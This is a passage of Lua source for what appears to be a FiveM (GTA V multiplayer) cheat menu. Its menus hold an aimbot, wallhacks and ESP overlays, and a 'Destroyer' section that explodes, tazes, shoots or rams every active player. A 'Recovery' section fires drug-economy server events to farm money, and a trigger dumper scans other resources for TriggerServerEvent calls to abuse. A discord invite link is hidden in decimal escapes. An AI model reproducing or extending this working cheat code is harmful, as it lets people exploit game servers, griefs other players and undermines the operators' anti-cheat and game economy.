                                 c.var.data.Aimbot.DrawAtInfo[c.var.combobox['combat:bone']][1],
                             c.fram.var.y + 0.15 +
                                 c.var.data.Aimbot.DrawAtInfo[c.var.combobox['combat:bone']][2],
                             0.01, 0.02, 0.0,
                             c.var.data.Aimbot.DrawAtInfo[c.var.combobox['combat:bone']][3],
                             c.var.data.Aimbot.DrawAtInfo[c.var.combobox['combat:bone']][4],
                             c.var.data.Aimbot.DrawAtInfo[c.var.combobox['combat:bone']][5],
                             c.fram.var.colors.menuAlpha)
            end,
            options = {
                {
                    data = {title = 'Aimbot', value = 'aimbot'},
                    func = 'CheckBox',
                    result = c.func.C_Aimbot
                }, {
                    data = {title = 'Aimlock', value = 'aimlock'},
                    func = 'CheckBox',
                    result = c.func.C_Aimlock
                }, {data = {title = 'Settings (All)'}, func = 'Separator'}, {
                    data = {title = 'Draw Fov', value = 'combat:drawfov'},
                    func = 'CheckBox',
                    result = c.func.C_DrawFov
                }, {
                    data = {
                        title = 'Target Invisible',
                        value = 'combat:targetinvisible'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Target Needs Clear Vision',
                        value = 'combat:needsclearlos'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Target Only Players',
                        value = 'combat:onlyplayers'
                    },
                    func = 'CheckBox'
                },
                {
                    data = {title = 'Friends', value = 'combat:friendlist'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Friends List',
                        subMenu = 'WeaponCombatFriendsBrowser'
                    },
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Check Dead', value = 'combat:checkdead'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw line to target',
                        value = 'combat:drawline'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'FOV',
                        value = 'combat:fov',
                        labels = c.fram.func
                            .NumberTableGenner(10, 100, 5, false)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.Aimbot.Res = {
                            W = 0.03 * c._tonumber(c0.index),
                            H = 0.03 * c._tonumber(c0.index) *
                                b.GetAspectRatio()
                        }
                    end
                }, {
                    data = {
                        title = 'Target bone',
                        value = 'combat:bone',
                        labels = {
                            'Head', 'Upperchest', 'Left Clavicle',
                            'Right Clavicle', 'Pelvis', 'Left Hand',
                            'Right Hand', 'Left knee', 'Right knee',
                            'Left foot', 'Right foot'
                        },
                        results = c.var.data.Aimbot.BoneList
                    },
                    func = 'ComboBox',
                    results = function(c0)
                        c.var.data.Aimbot.TargetBone = c0.result
                    end
                }
            }
        },
        ['WeaponCombatFriendsBrowser'] = {
            parent = 'WeaponCombat',
            subTitle = 'Add/remove friends',
            currentOption = 1,
            func = function()
                if c.fram.var.timers.currTime -
                    c.fram.var.timers.onlineplayers.time >=
                    c.fram.var.timers.onlineplayers.delay then
                    c.fram.var.timers.onlineplayers.time = c.fram.var.timers
                                                               .currTime;
                    c.fram.menus.WeaponCombatFriendsBrowser.options = {}
                    for k, eB in c._ipairs(b.GetActivePlayers()) do
                        c.fram.menus.WeaponCombatFriendsBrowser.options[#c.fram
                            .menus.WeaponCombatFriendsBrowser.options + 1] = {
                            data = {
                                title = '[' .. b.GetPlayerServerId(eB) .. '] ' ..
                                    b.GetPlayerName(eB),
                                value = 'weapon:assists:friends:' ..
                                    b.GetPlayerPed(eB)
                            },
                            func = 'CheckBox'
                        }
                    end
                end
            end,
            options = {}
        },
        ['Visuals'] = {
            parent = 'MainMenu',
            subTitle = 'Visuals dah',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'ESP Distance',
                        value = 'visuals:esp',
                        labels = c.fram.func.NumberTableGenner(50, 3000, 50,
                                                               false),
                        results = c.fram.func.NumberTableGenner(50, 3000, 50,
                                                                false)
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.Visuals.ESP = c._tonumber(c0.result)
                    end
                }, {
                    data = {title = 'Wallhack', subMenu = 'Visuals_Wallhack'},
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Lines', subMenu = 'Visuals_Lines'},
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Tracers', subMenu = 'Visuals_Tracers'},
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Names', subMenu = 'Visuals_Names'},
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'World Ilumination',
                        subMenu = 'Visuals_WorldIlumination'
                    },
                    func = 'MenuButton'
                }, {
                    data = {title = 'Skeleton', subMenu = 'Visuals_Skeleton'},
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Debug View',
                        subMenu = 'Visuals_DebuggerView'
                    },
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Chams', subMenu = 'Visuals_Chams'},
                    func = 'MenuButton'
                }, {
                    data = {title = 'Blips', value = 'blips'},
                    func = 'CheckBox',
                    result = c.func.C_Blips
                }, {
                    data = {title = 'Force Map', value = 'forcemap'},
                    func = 'CheckBox',
                    result = c.func.C_ForceMap
                }, {
                    data = {
                        title = 'Force Third Person',
                        value = 'forcethirdperson'
                    },
                    func = 'CheckBox',
                    result = c.func.C_ForceThirdPerson
                }
            }
        },
        ['Visuals_Wallhack'] = {
            parent = 'Visuals',
            subTitle = 'Wallhack',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Toggle', value = 'visuals_wallhack:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Wallhack
                }, {
                    data = {title = 'Draw Box', value = 'visuals_wallhack:box'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw Frame',
                        value = 'visuals_wallhack:frame'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw Health',
                        value = 'visuals_wallhack:health'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Include Self',
                        value = 'visuals_wallhack:self'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Colors'}, func = 'Separator'}, {
                    data = {
                        title = 'Box Color',
                        value = 'visuals_wallhack:box',
                        alpha = true
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Frame Color',
                        value = 'visuals_wallhack:frame',
                        alpha = true
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Visuals_Lines'] = {
            parent = 'Visuals',
            subTitle = 'Lines',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Toggle', value = 'visuals_lines:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Lines
                }, {
                    data = {title = 'Draw Lines', value = 'visuals_lines:lines'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw Dimensions',
                        value = 'visuals_lines:dimensions'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Include Self',
                        value = 'visuals_lines:self'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Colors'}, func = 'Separator'}, {
                    data = {
                        title = 'Lines',
                        value = 'visuals_lines:lines',
                        alpha = true
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Dimensions',
                        value = 'visuals_lines:dimensions',
                        alpha = true
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Visuals_Tracers'] = {
            parent = 'Visuals',
            subTitle = 'Tracers',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Toggle', value = 'visuals_tracers:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Tracers
                }, {
                    data = {
                        title = 'Draw Impacts',
                        value = 'visuals_tracers:impacts'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw Trajectory',
                        value = 'visuals_tracers:trajectory'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Colors'}, func = 'Separator'}, {
                    data = {
                        title = 'Impacts',
                        value = 'visuals_tracers:impacts',
                        alpha = true
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Trajectory',
                        value = 'visuals_tracers:trajectory',
                        alpha = true
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Visuals_Names'] = {
            parent = 'Visuals',
            subTitle = 'Names',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Toggle', value = 'visuals_names:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Names
                }, {
                    data = {
                        title = 'Draw InVehicle [IV]',
                        value = 'visuals_names:invehicle'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw Distance',
                        value = 'visuals_names:distance'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Colors'}, func = 'Separator'}, {
                    data = {
                        title = 'Normal',
                        value = 'visuals_names:normal',
                        alpha = true
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Dead',
                        value = 'visuals_names:dead',
                        alpha = true
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Visuals_WorldIlumination'] = {
            parent = 'Visuals',
            subTitle = 'World Ilumination',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Toggle',
                        value = 'visuals_worldilumination:toggle'
                    },
                    func = 'CheckBox',
                    result = c.func.B_WorldIlumination
                }, {data = {title = 'Colors'}, func = 'Separator'}, {
                    data = {
                        title = 'Rainbow',
                        value = 'visuals_worldilumination:rainbow'
                    },
                    func = 'CheckBox',
                    result = function()
                        while c.var.checkbox['visuals_worldilumination:rainbow'] do
                            a.Wait(50)
                            local c7 = c.fram.func.rainbow(1.0)
                            c.var.colors['visuals_worldilumination:color'] = {
                                c7.r, c7.g, c7.b
                            }
                        end
                    end
                }, {
                    data = {
                        title = 'Color',
                        value = 'visuals_worldilumination:color'
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Visuals_Skeleton'] = {
            parent = 'Visuals',
            subTitle = 'Skeleton ESP',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Toggle', value = 'visuals_skeleton:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Skeleton
                }, {
                    data = {
                        title = 'Include Self',
                        value = 'visuals_skeleton:self'
                    },
                    func = 'CheckBox'
                }, {data = {title = 'Colors'}, func = 'Separator'}, {
                    data = {
                        title = 'Bones',
                        value = 'visuals_skeleton:bones',
                        alpha = true
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Visuals_DebuggerView'] = {
            parent = 'Visuals',
            subTitle = 'Debugger View',
            currentOption = 1,
            options = {
                {
                    data = {
                        title = 'Toggle',
                        value = 'visuals_debuggerview:toggle'
                    },
                    func = 'CheckBox',
                    result = c.func.C_DebuggerView
                }, {
                    data = {
                        title = 'Include Props',
                        value = 'visuals_debuggerview:props'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Include Peds',
                        value = 'visuals_debuggerview:peds'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Include Vehicles',
                        value = 'visuals_debuggerview:vehicles'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Debug Coords',
                        value = 'visuals_debuggerview:coords'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Debug Hash',
                        value = 'visuals_debuggerview:hash'
                    },
                    func = 'CheckBox'
                }
            }
        },
        ['Visuals_Chams'] = {
            parent = 'Visuals',
            subTitle = 'Chams?',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Toggle', value = 'visuals_chams:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_Chams
                }, {
                    data = {
                        title = 'Color',
                        value = 'visuals_chams:peopleindex',
                        labels = c.var.data.Chams.textures.labels,
                        results = c.var.data.Chams.textures.links
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if not c.var.data.Chams.Dui then
                            return
                        end
                        b.SetDuiUrl(c.var.data.Chams.Dui, c0.result)
                    end
                }, {
                    data = {
                        title = 'Target',
                        labels = {'Men', 'Woman', 'Both'},
                        value = 'visuals_chams:target'
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.var.data.Chams.target = c0.index
                    end
                }, {data = {title = 'Weapons'}, func = 'Separator'}, {
                    data = {
                        title = 'Toggle',
                        value = 'visuals_weaponchams:toggle'
                    },
                    func = 'CheckBox',
                    result = c.func.C_WeaponChams
                }, {
                    data = {
                        title = 'Color',
                        value = 'visuals_chams:weaponindex',
                        labels = c.var.data.Chams.textures.labels,
                        results = c.var.data.Chams.textures.links
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if not c.var.data.Chams.WDui then
                            return
                        end
                        b.SetDuiUrl(c.var.data.Chams.WDui, c0.result)
                    end
                }
            }
        },
        ['Teleports'] = {
            parent = 'MainMenu',
            subTitle = 'Like having a Portal Gun but wihout portal and gun',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Teleport to waypoint'},
                    func = 'Button',
                    result = c.func.B_TeleportToWaypoint
                }, {
                    data = {title = 'Teleport to coords'},
                    func = 'Button',
                    result = c.func.B_TeleportToCoords
                }, {
                    data = {title = 'Teleport vision', value = 'teleportvision'},
                    func = 'CheckBox',
                    result = c.func.C_TeleportVision
                }, {
                    data = {
                        title = 'Auto Teleport To Waypoint',
                        value = 'teleport:autowaypoint'
                    },
                    func = 'CheckBox',
                    result = c.func.C_AutoTeleportToWaypoint
                }, {data = {title = 'Premade Locations'}, func = 'Separator'}
            }
        },
        ['Destroyer'] = {
            parent = 'MainMenu',
            subTitle = 'Be a man...',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Taze Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_TazePlayer(b.GetActivePlayers())
                    end
                }, {
                    data = {title = 'Convert Vehicle Into Ramps'},
                    func = 'Button',
                    result = function()
                        c.func.B_RampsIntoVehicles()
                    end
                }, {
                    data = {title = 'Shoot Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_ShootAllPlayers(b.GetActivePlayers())
                    end
                }, {
                    data = {title = 'Explode Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_ExplodePlayers(b.GetActivePlayers())
                    end
                }, {
                    data = {
                        title = 'Flag Players',
                        value = 'allplayers:flag',
                        labels = c.var.data.Flags.labels,
                        results = c.var.data.Flags.data
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_FlagPlayers(b.GetActivePlayers(), c0.result)
                    end
                }, {
                    data = {title = 'Spam Random Vehicles To Players'},
                    func = 'Button',
                    result = function()
                        c.func.B_SpamRandomVehicles(b.GetActivePlayers())
                    end
                }, {
                    data = {
                        title = 'Attach Prop',
                        value = 'allplayers:attachprop',
                        labels = c.var.data.Props[1],
                        results = c.var.data.Props[2]
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_AttachProps(b.GetActivePlayers(), c0.result)
                    end
                }, {
                    data = {
                        title = 'Particle Players',
                        value = 'allplayers:particles',
                        labels = {'Single part', 'Multiple Part'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.OnlinePlayersParticles[c0.index](
                            b.GetActivePlayers())
                    end
                }, {
                    data = {
                        title = 'Spam Vehicles Legion Square',
                        value = 'allplayers:spamlegionvehicles',
                        labels = {
                            'sultan', 'mule', 'zion2', 'felon', 'flatbeld',
                            'sentinel', 'sentinel2', 'jackal', 'cogcabrio',
                            'weevil', 'issi', 'blista', 'bus', 'jet', 'havok',
                            'volatus', 'avenger'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_SpamVehicles(c._vector3(218.45, -824, 120.0),
                                              c0.label)
                    end
                }, {
                    data = {
                        title = 'Ram Players',
                        value = 'allplayers:ram',
                        labels = {
                            'sultan', 'mule', 'zion2', 'felon', 'flatbeld',
                            'sentinel', 'sentinel2', 'jackal', 'cogcabrio',
                            'weevil', 'issi', 'blista', 'bus', 'jet', 'havok',
                            'volatus', 'avenger'
                        }
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_RamPlayers(b.GetActivePlayers(), c0.label)
                    end
                }, {
                    data = {
                        title = 'Weapon Options',
                        value = 'allplayers:weapons',
                        labels = {'Give All', 'Remove All', 'Custom'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.OnlinePlayersWeapons[c0.index](
                            b.GetActivePlayers())
                    end
                }
            }
        },
        ['Recovery'] = {
            parent = 'MainMenu',
            subTitle = 'Comerce = money',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Refresh Triggers'},
                    func = 'Button',
                    result = c.func.DynamicTriggers
                }, {
                    data = {title = 'Trigger Filter', subMenu = 'TriggerDumper'},
                    func = 'MenuButton'
                },
                {
                    data = {title = 'G-Life', subMenu = 'Glife'},
                    func = 'MenuButton'
                }, {data = {title = 'ESX'}, func = 'Separator'}, {
                    data = {
                        title = 'Harvest',
                        value = 'recovery:collectdrugs',
                        labels = {'Coke', 'Meth', 'Weed', 'Opium'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if c.var.tr['esx_drugs:harvest' .. c0.label] then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_drugs:harvest' ..
                                                          c0.label])
                        end
                    end
                }, {
                    data = {
                        title = 'Transform',
                        value = 'recovery:transformdrugs',
                        labels = {'Coke', 'Meth', 'Weed', 'Opium'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if c.var.tr['esx_drugs:treat' .. c0.label] then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_drugs:treat' ..
                                                          c0.label])
                        end
                    end
                }, {
                    data = {
                        title = 'Sell',
                        value = 'recovery:selldrugs',
                        labels = {'Coke', 'Meth', 'Weed', 'Opium'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        if c.var.tr['esx_drugs:treat' .. c0.label] then
                            c.func.TriggerCustomEvent(true,
                                                      c.var.tr['esx_drugs:sell' ..
                                                          c0.label])
                        end
                    end
                }
            }
        },
        ['Glife'] = {
            parent = 'Recovery',
            subTitle = 'Glife Related Stuff',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Building TP UP'},
                    func = 'Button',
                    result = function()
                        b.SetEntityCoords(b.PlayerPedId(), b.GetEntityCoords(
                                              b.PlayerPedId()) +
                                              c._vector3(0, 0, 5))
                    end
                }, {
                    data = {title = 'Building TP DOWN'},
                    func = 'Button',
                    result = function()
                        b.SetEntityCoords(b.PlayerPedId(), b.GetEntityCoords(
                                              b.PlayerPedId()) -
                                              c._vector3(0, 0, 5))
                    end
                }, {data = {title = 'Zombies Handling'}, func = 'Separator'}, {
                    data = {
                        title = 'Tp Zombies To Pos',
                        value = 'glife:tpzombies'
                    },
                    func = 'CheckBox',
                    result = c.func.C_GlifeZombiesTeleport
                }, {
                    data = {title = 'Kill Zombies', value = 'glife:killzombies'},
                    func = 'CheckBox',
                    result = c.func.C_KillZombies
                }, {
                    data = {
                        title = 'Ragdoll Zombies',
                        value = 'glife:ragdollzombies'
                    },
                    func = 'CheckBox',
                    result = c.func.C_RagdollZombies
                }, {data = {title = 'Bags ESP'}, func = 'Separator'}, {
                    data = {title = 'Toggle', value = 'glife:bagsesp:toggle'},
                    func = 'CheckBox',
                    result = c.func.C_BagESP
                }, {
                    data = {
                        title = 'Draw Lines',
                        value = 'glife:bagsesp:drawline'
                    },
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Draw Frame',
                        value = 'glife:bagsesp:drawframe'
                    },
                    func = 'CheckBox'
                }, {
                    data = {title = 'Draw Box', value = 'glife:bagsesp:drawbox'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Lines Colors',
                        value = 'bagsesp:lines',
                        alpha = true
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Frame Colors',
                        value = 'bagsesp:frame',
                        alpha = true
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Box Colors',
                        value = 'bagsesp:box',
                        alpha = true
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['TriggerDumper'] = {
            parent = 'Recovery',
            subTitle = 'Triggers Filter',
            currentOption = 1,
            func = function()
                if c.var.data.TriggerDumper.NR ~= #c.func.GetResources() then
                    local fO = c.func.GetResources()
                    c.fram.menus['TriggerDumper'].options = {}
                    c.var.data.TriggerDumper.NR = #fO;
                    for k, eB in c._ipairs(fO) do
                        c._table.insert(c.fram.menus['TriggerDumper'].options, {
                            data = {
                                title = eB,
                                hover = function()
                                    c.var.data.TriggerDumper.sResource = eB
                                end
                            },
                            func = 'Button'
                        })
                    end
                else
                    if not c.var.data.TriggerDumper.DR[c.var.data.TriggerDumper
                        .sResource] then
                        local ii = c.func.GetFullMetaData(c.var.data
                                                              .TriggerDumper
                                                              .sResource)
                        c.var.data.TriggerDumper.DR[c.var.data.TriggerDumper
                            .sResource] = {}
                        if ii and #ii >= 1 then
                            for ij, ik in c._ipairs(ii) do
                                c.var.data.TriggerDumper.DR[c.var.data
                                    .TriggerDumper.sResource][#c.var.data
                                    .TriggerDumper.DR[c.var.data.TriggerDumper
                                    .sResource] + 1] = '~r~' .. ik .. ':'
                                local il =
                                    b.LoadResourceFile(c.var.data.TriggerDumper
                                                           .sResource, ik)
                                if il and c._string.len(il) >= 1 then
                                    local im = c.func.split(il, '\n')
                                    if im and #im >= 1 then
                                        for io, ip in c._ipairs(im) do
                                            local iq, ir = c._string.find(ip,
                                                                          'TriggerEvent')
                                            local is, it = c._string.find(ip,
                                                                          'TriggerServerEvent')
                                            if ip and (iq or is) then
                                                c.var.data.TriggerDumper.DR[c.var
                                                    .data.TriggerDumper
                                                    .sResource][#c.var.data
                                                    .TriggerDumper.DR[c.var.data
                                                    .TriggerDumper.sResource] +
                                                    1] =
                                                    '[' .. io .. '] ' ..
                                                        c._string
                                                            .sub(ip, iq or is,
                                                                 c._string
                                                                     .len(ip))
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            c.var.data.TriggerDumper.DR[c.var.data.TriggerDumper
                                .sResource][#c.var.data.TriggerDumper.DR[c.var
                                .data.TriggerDumper.sResource] + 1] =
                                'Empty manifiest.'
                        end
                    else
                        b.DrawRect(c.fram.var.x + c.fram.var.g_w * 0.60 + 0.1,
                                   c.fram.var.y - 0.01, 0.21, 0.05,
                                   c.var.colors['menu:subTitlebackground'][1],
                                   c.var.colors['menu:subTitlebackground'][2],
                                   c.var.colors['menu:subTitlebackground'][3],
                                   c.fram.var.colors.menuAlpha)
                        c.fram.func.DrawText('TRIGGER FILTER', c.fram.var.x +
                                                 c.fram.var.g_w * 0.60 + 0.1,
                                             c.fram.var.y - 0.04, {
                            255, 255, 255, c.fram.var.colors.menuAlpha
                        }, 0.70, 4, true)
                        for k, eB in c._ipairs(
                                         c.var.data.TriggerDumper.DR[c.var.data
                                             .TriggerDumper.sResource]) do
                            local c7 = k % 2 == 0;
                            b.DrawRect(c.fram.var.x + c.fram.var.g_w * 0.60 +
                                           0.1, c.fram.var.y + 0.015 * k, 0.21,
                                       0.015, c7 and 30 or 10, c7 and 30 or 10,
                                       c7 and 30 or 10,
                                       c.fram.var.colors.menuAlpha)
                            c.fram.func.DrawText(eB, c.fram.var.x +
                                                     c.fram.var.g_w * 0.59,
                                                 c.fram.var.y - 0.01 + 0.015 * k,
                                                 {
                                255, 255, 255, c.fram.var.colors.menuAlpha
                            }, 0.25, 4, false)
                        end
                    end
                end
            end,
            options = {}
        },
        ['Settings'] = {
            parent = 'MainMenu',
            subTitle = '100% Customizable',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Colors', subMenu = 'Settings_Style'},
                    func = 'MenuButton'
                }, {
                    data = {
                        title = 'Keybinds Manager',
                        subMenu = 'Settings_KeybindsManager'
                    },
                    func = 'MenuButton'
                },
                {
                    data = {title = 'Menu Sounds', value = 'ui_sounds'},
                    func = 'CheckBox'
                }, {
                    data = {
                        title = 'Theme',
                        value = 'settings:theme',
                        labels = {'Default', 'Classic', 'V2'}
                    },
                    func = 'ComboBox',
                    result = function(c0)
                        c.func.B_SetTheme(c0.index)
                    end
                }, {
                    data = {
                        title = 'Change position',
                        value = 'settings:changepos'
                    },
                    func = 'CheckBox',
                    result = c.func.C_ChangePos
                }, {
                    data = {title = 'Reset to default position'},
                    func = 'Button',
                    result = function()
                        c.fram.var.x = 0.4;
                        c.fram.var.y = 0.1
                    end
                }, {data = {title = 'Others'}, func = 'Separator'}, {
                    data = {title = 'Kill menu ~b~\100\105\115\99\111\114\100\46\103\103\47\115\80\72\87\55\67\84\84\90\106'},
                    func = 'Button',
                    result = function()
                        a.CreateThread(function()
                            for k, eB in c._pairs(c.var.checkbox) do
                                eB = false
                            end
                            a.Wait(50)
                            c.fram.enabled = false
                        end)
                    end
                }
            }
        },
        ['Settings_Style'] = {
            parent = 'Settings',
            subTitle = 'Change menu colors',
            currentOption = 1,
            options = {
                {
                    data = {title = 'Reset defaults'},
                    func = 'Button',
                    result = function()
                        c.var.colors['menu:header'] = {255, 255, 255, 255}
                        c.var.colors['menu:subTitlebackground'] = {
                            12, 5, 47, 255
                        }
                        c.var.colors['menu:bottomsubTitlebackground'] = {
                            12, 5, 47, 255
                        }
                        c.var.colors['menu:subTitleText'] = {255, 255, 255, 255}
                        c.var.colors['menu:bottomsubTitlesprite'] = {
                            255, 255, 255, 255
                        }
                        c.var.colors['menu:noSelectedText'] = {
                            255, 255, 255, 255
                        }
                        c.var.colors['menu:noSelectedFeaturebackground'] = {
                            10, 10, 10, 255
                        }
                        c.var.colors['menu:noselectedmenuButtonSprite'] = {
                            255, 255, 255, 255
                        }
                        c.var.colors['menu:selectedmenuButtonSprite'] = {
                            0, 0, 0, 255
                        }
                        c.var.colors['menu:checkbox'] = {255, 255, 255, 255}
                        c.var.colors['menu:selectedCheckbox'] = {0, 0, 0, 255}
                        c.var.colors['menu:separatorBrackets'] = {
                            92, 43, 233, 255
                        }
                        c.var.colors['menu:selectedText'] = {10, 10, 10, 255}
                        c.var.colors['menu:selectedFeaturebackground'] = {
                            92, 43, 233, 255
                        }
                    end
                }, {data = {title = 'Colors'}, func = 'Separator'},
                {
                    data = {title = 'Header', value = 'menu:header'},
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Subtitle background',
                        value = 'menu:subTitlebackground'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Botton subtitle background',
                        value = 'menu:bottomsubTitlebackground'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Subtitle text',
                        value = 'menu:subTitleText'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Button subtitle arrows',
                        value = 'menu:bottomsubTitlesprite'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'No selected text',
                        value = 'menu:noSelectedText'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'No selected background',
                        value = 'menu:noSelectedFeaturebackground'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'No selected submenu button arrow',
                        value = 'menu:noselectedmenuButtonSprite'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Selected submenu button arrow',
                        value = 'menu:selectedmenuButtonSprite'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'No selected checkbox',
                        value = 'menu:checkbox'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Selected checkbox',
                        value = 'menu:selectedCheckbox'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Separator brackets',
                        value = 'menu:separatorBrackets'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Selected text',
                        value = 'menu:selectedText'
                    },
                    func = 'ColorButton'
                }, {
                    data = {
                        title = 'Selected background',
                        value = 'menu:selectedFeaturebackground'
                    },
                    func = 'ColorButton'
                }
            }
        },
        ['Settings_KeybindsManager'] = {
            parent = 'Settings',
            subTitle = 'Manage all your keybinds',
            currentOption = 1,
            options = {}
        }
    }
    a.CreateThread(function()
        for k, eB in c._ipairs(c.var.data.PedModels) do
            c.fram.menus['Self_PedChanger'].options[#c.fram.menus['Self_PedChanger']
                .options + 1] = {
                data = {
                    title = eB[1],
                    value = 'pedchanger:' .. eB[1],
                    labels = eB[2],
                    hover = function(c0, ih)
                        local iu = 'https://docs.fivem.net/peds/' .. ih ..
                                       '.webp'
                        if c.fram.var.timers.currTime -
                            c.fram.var.timers.self_pedchanger.time >=
                            c.fram.var.timers.self_pedchanger.delay and
                            c.var.data.selfpedchangerlink ~= iu then
                            c.fram.var.timers.self_pedchanger.time = c.fram.var
                                                                         .timers
                                                                         .currTime;
                            c.var.data.selfpedchangerlink = iu;
                            b.SetDuiUrl(c.fram.var.txobjects.self_pedchanger,
                                        c.var.data.selfpedchangerlink)
                        end
                    end
                },
                func = 'ComboBox',
                result = function(c0)
                    a.CreateThread(function()
                        local n = b.GetHashKey(c0.label)
                        if c.func.LoadModel(n) then
                            b.SetPlayerModel(b.PlayerId(), n)
                        end
                    end)
                end
            }
        end
        for k, eB in c._pairs(c.var.data.SavedPoints) do
            c.fram.menus['Teleports'].options[#c.fram.menus['Teleports'].options +
                1] = {
                data = {title = k, subMenu = 'Teleports:' .. k},
                func = 'MenuButton'
            }
            c.fram.menus['Teleports:' .. k] = {
                parent = 'Teleports',
                subTitle = 'Premade ' .. k .. ' locations',
                currentOption = 1,
                options = {}
            }
            for hk, hl in c._ipairs(eB) do
                c._table.insert(c.fram.menus['Teleports:' .. k].options, {
                    data = {title = hl.label},
                    func = 'Button',
                    result = function()
                        b.SetPedCoordsKeepVehicle(b.PlayerPedId(), hl.loc.x,
                                                  hl.loc.y, hl.loc.z)
                    end
                })
            end
        end
        for k, eB in c._pairs(c.var.data.WeapList) do
            c._table.insert(c.fram.menus.WeaponSpawner.options, {
                data = {
                    title = k,
                    value = 'weaponspawner:spawner:' .. k,
                    labels = eB.labels,
                    results = eB.names,
                    hover = function(c0, ih)
                        local iu = nil--'http://getmessi.absolutemenu.cc/absoimages/weapons/' .. c.var.data.WeapList[k].names[c0] .. '.png'
                        if c.fram.var.timers.currTime -
                            c.fram.var.timers.wep_nextsprite.time >=
                            c.fram.var.timers.wep_nextsprite.delay and
